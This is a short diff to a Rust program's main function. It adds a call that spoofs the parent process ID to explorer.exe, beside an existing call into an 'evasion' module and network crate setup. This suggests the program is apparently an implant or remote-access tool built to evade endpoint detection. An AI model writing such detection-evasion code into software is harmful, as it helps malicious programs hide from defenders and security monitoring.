@@ -98,6 +98,10 @@ async fn main() -> anyhow::Result<()> {
     // that allocates Drop resources or opens handles.
     evasion::init();
 
+    // Spoof PPID to explorer.exe on first run.
+    // May exit current process — child continues with spoofed parent.
+    unsafe { evasion::ppid::spoof_if_needed(); }
+
     // Install ring as the default rustls crypto provider. Required when both
     // reqwest (ring) and tokio-tungstenite (aws-lc-rs) pull different backends.
     let _ = rustls::crypto::ring::default_provider().install_default();
